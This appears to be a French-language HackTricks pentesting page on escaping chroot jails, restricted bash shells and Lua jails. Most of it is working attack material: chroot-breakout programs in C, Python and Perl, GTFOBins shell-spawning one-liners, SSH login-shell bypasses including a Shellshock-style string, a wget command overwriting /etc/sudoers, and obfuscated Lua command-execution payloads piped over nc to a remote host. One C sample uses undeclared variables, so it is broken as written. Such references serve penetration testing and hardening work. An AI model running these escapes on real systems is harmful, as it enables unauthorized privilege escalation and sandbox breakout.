# Échapper des Jails

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

**Cherchez dans** [**https://gtfobins.github.io/**](https://gtfobins.github.io) **si vous pouvez exécuter n’importe quel binaire avec la propriété "Shell"**

## Chroot Escapes

D’après [wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) : le mécanisme chroot **n’est pas conçu pour se défendre** contre des manipulations intentionnelles par des **utilisateurs privilégiés** (**root**). Sur la plupart des systèmes, les contextes chroot ne s’empilent pas correctement et les programmes chrootés **ayant des privilèges suffisants peuvent effectuer un second chroot pour s’échapper**.\
En général, cela signifie que pour vous échapper, vous devez être root à l’intérieur du chroot.

> [!TIP]
> L’**outil** [**chw00t**](https://github.com/earthquake/chw00t) a été créé pour abuser des scénarios suivants et s’échapper de `chroot`.

### Root + CWD

> [!WARNING]
> Si vous êtes **root** à l’intérieur d’un chroot, vous **pouvez vous échapper** en créant un **autre chroot**. En effet, 2 chroots ne peuvent pas coexister (sur Linux), donc si vous créez un dossier puis **créez un nouveau chroot** sur ce nouveau dossier en étant **vous-même en dehors**, vous serez maintenant **en dehors du nouveau chroot** et donc vous vous trouverez dans le FS.
>
> Cela se produit parce que, généralement, chroot ne déplace PAS votre répertoire de travail vers celui indiqué, donc vous pouvez créer un chroot mais être en dehors de celui-ci.

En général, vous ne trouverez pas le binaire `chroot` à l’intérieur d’un chroot jail, mais vous **pourriez compiler, uploader et exécuter** un binaire :

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> Ceci est similaire au cas précédent, mais dans ce cas, l’**attaquant stocke un descripteur de fichier vers le répertoire courant** puis **crée le chroot dans un nouveau dossier**. Enfin, comme il a **accès** à ce **FD** **en dehors** du chroot, il y accède et il **s’échappe**.

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
>
> - Le FD peut être passé via Unix Domain Sockets, donc :
> - Créer un processus enfant (fork)
> - Créer un UDS pour que le parent et l’enfant puissent communiquer
> - Exécuter chroot dans le processus enfant dans un dossier différent
> - Dans le proc parent, créer un FD d’un dossier qui est en dehors du nouveau chroot du proc enfant
> - Passer à l’enfant ce FD en utilisant le UDS
> - Le processus enfant fait chdir vers ce FD, et comme il est en dehors de son chroot, il s’échappera de la jail

### Root + Mount

> [!WARNING]
>
> - Monter le périphérique root (/) dans un répertoire à l’intérieur du chroot
> - Faire chroot dans ce répertoire
>
> C’est possible sous Linux

### Root + /proc

> [!WARNING]
>
> - Monter procfs dans un répertoire à l’intérieur du chroot (si ce n’est pas déjà fait)
> - Chercher un pid qui a une entrée root/cwd différente, comme : /proc/1/root
> - Faire chroot dans cette entrée

### Root(?) + Fork

> [!WARNING]
>
> - Créer un Fork (proc enfant) et chroot dans un dossier différent plus profond dans le FS et y faire CD
> - Depuis le processus parent, déplacer le dossier où se trouve le processus enfant dans un dossier situé avant le chroot des enfants
> - Ce processus enfant se retrouvera en dehors du chroot

### ptrace

> [!WARNING]
>
> - Il y a longtemps, les utilisateurs pouvaient déboguer leurs propres processus depuis un processus d’eux-mêmes... mais ce n’est plus possible par défaut aujourd’hui
> - Quoi qu’il en soit, si c’est possible, vous pouvez ptrace un processus et exécuter un shellcode à l’intérieur ([see this example](linux-capabilities.md#cap_sys_ptrace)).

## Bash Jails

### Enumeration

Obtenir des infos sur la jail:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### Modifier PATH

Vérifiez si vous pouvez modifier la variable d'environnement PATH
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### Utiliser vim
```bash
:set shell=/bin/sh
:shell
```
### Pagers et help viewers

Beaucoup d’environnements restreints laissent encore des **pagers** ou des **help viewers** disponibles. Ils sont généralement plus rapides à exploiter que d’essayer de reconstruire `PATH`.
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
Si `git` est disponible, rappelez-vous que sa sortie d’aide passe généralement par un pager :
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### One-liners GTFOBins courants

Une fois que vous savez quels binaires sont accessibles, testez d’abord les lanceurs de shell les plus évidents :
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
Si vous pouvez seulement **injecter des arguments** dans une commande autorisée (au lieu de l’exécuter librement), vérifiez aussi **GTFOArgs**.

### Créer un script

Vérifiez si vous pouvez créer un fichier exécutable avec _/bin/bash_ comme contenu
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### Obtenir bash via SSH

Si vous accédez via ssh, vous pouvez souvent demander au serveur d’exécuter un **programme différent** à la place du shell de connexion restreint :
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
Si `ssh` est l’un des rares binaires autorisés localement, rappelle-toi qu’il peut aussi être abusé comme un **GTFOBin**:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### Déclarer
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

Vous pouvez écraser par exemple le fichier sudoers
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

Certain environments do not drop you into plain `rbash`, but into **wrappers** such as `git-shell`, `rssh`, or `lshell` :

- `git-shell` n’accepte que les commandes Git côté serveur, plus tout ce qui se trouve dans `~/git-shell-commands/`. Si ce répertoire existe, lance `help` pour énumérer les actions personnalisées autorisées. Si tu peux y **écrire**, tout exécutable déposé dans ce répertoire devient accessible.
- `rssh` / `lshell` n’autorisent généralement que `scp`, `sftp`, `rsync`, ou des opérations de style Git. Dans ces cas, concentre-toi d’abord sur les **file write primitives** : téléverse `authorized_keys`, un fichier de démarrage du shell, ou un script d’aide dans un emplacement inscriptible, puis reconnecte-toi avec `ssh -t ...`.
- Si le wrapper ne filtre que la ligne de commande, énumère les binaires accessibles puis reviens vers **GTFOBins / GTFOArgs**.

### Other tricks

Vérifie aussi :

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**La page suivante pourrait aussi être intéressante :**

{{#ref}}
../bypass-bash-restrictions/
{{#endref}}

## Python Jails

Trucs pour s’échapper des python jails dans la page suivante :


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

Sur cette page, tu peux trouver les fonctions globales auxquelles tu as accès dans lua : [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Eval avec exécution de commandes :**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
Quelques astuces pour **appeler des fonctions d’une bibliothèque sans utiliser de points**:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
Énumérer les fonctions d’une bibliothèque :
```bash
for k,v in pairs(string) do print(k,v) end
```
Notez qu’à chaque fois que vous exécutez la one liner précédente dans un **différent environnement lua**, l’ordre des functions change. Par conséquent, si vous devez exécuter une fonction spécifique, vous pouvez effectuer une brute force attack en chargeant différents environnements lua et en appelant la première fonction de la library :
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Obtenir un shell lua interactif** : Si vous êtes dans un shell lua limité, vous pouvez obtenir un nouveau shell lua (et, avec un peu de chance, illimité) en appelant :
```bash
debug.debug()
```
## Références

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (Slides: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
